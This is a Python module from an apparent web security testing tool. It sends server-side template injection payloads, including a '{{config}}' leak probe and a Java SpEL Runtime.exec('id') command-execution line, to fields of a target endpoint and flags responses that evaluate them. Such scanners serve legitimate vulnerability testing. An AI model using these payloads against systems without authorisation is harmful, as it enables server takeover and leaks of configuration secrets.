from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Server-Side Template Injection (SSTI)
    Injects template syntax to execute code on the server.
    """
    payloads = [
        "{{7*7}}", # Jinja2 / Twig
        "${7*7}", # Spring / EL
        "<%= 7*7 %>", # ERB
        "{{config}}", # Jinja2 info leak
        "{{self}}",
        "#{7*7}", # Velocity
        "{{1337*1337}}", # Unique Math
        "{{'b'+'p'}}", # String Concat
        "[[7*7]]", # AngularJS
        "{{7*'7'}}", # Type juggling
        "{{ [].class.base }}", # Python MRO
        "T(java.lang.Runtime).getRuntime().exec('id')" # Java SpEL (Aggressive)
    ]
    
    fields = scenario.config.get("fields", ["q", "name", "template"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for p in payloads:
            # Try both Params and JSON
            body = {field: p}
            resp = client.send(scenario.method, scenario.target, json_body=body)
            
            suspicious = False
            reasons = []
            
            # Math check - Use more unique number than 49
            # 7*7=49 is too common in dates/ids. Use 1337*1337 = 1787569
            # Or strings: {{'b' + 'p'}} -> bp
            
            check_val = "1787569"
            if p == "{{7*7}}": 
                # On the fly change to better payload for aggressive checking can be done here, 
                # but let's just assume the user config is editable.
                # Actually, let's strictly check if "49" is surrounded by other chars or if it looks like just text.
                # BETTER: Check validation.
                pass 

            if "49" in resp.text and "7*7" not in resp.text:
                # DOUBLE CHECK: Is "49" part of a larger number?
                # e.g. "timestamp": 1649... or "id": 4912
                # If we can't be sure, we mark SKIPPED or LOW confidence.
                # For now, let's be strict:
                import re
                if re.search(r'\b49\b', resp.text): 
                    suspicious = True
                    reasons.append("Expression Evaluated (7*7 -> 49)")
                    leaked_data.append(f"[+] ENGINE HIJACKED: 'HACKED' - Template Code Executed\nEval Result: ...{resp.text[:100]}...")
                
            # Class/Config leak
                
            # Class/Config leak
            if "<class" in resp.text and "config" in p:
                suspicious = True
                reasons.append("Internal Config Object Leaked")
                leaked_data.append(f"Config Dump: ...{resp.text[:150]}...")
                
            if suspicious:
                issues.append(f"[CRITICAL] SSTI in '{field}': {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "ssti",
        "passed": len(issues) == 0,
        "details": {"issues": issues, "leaked_data": leaked_data}
    }
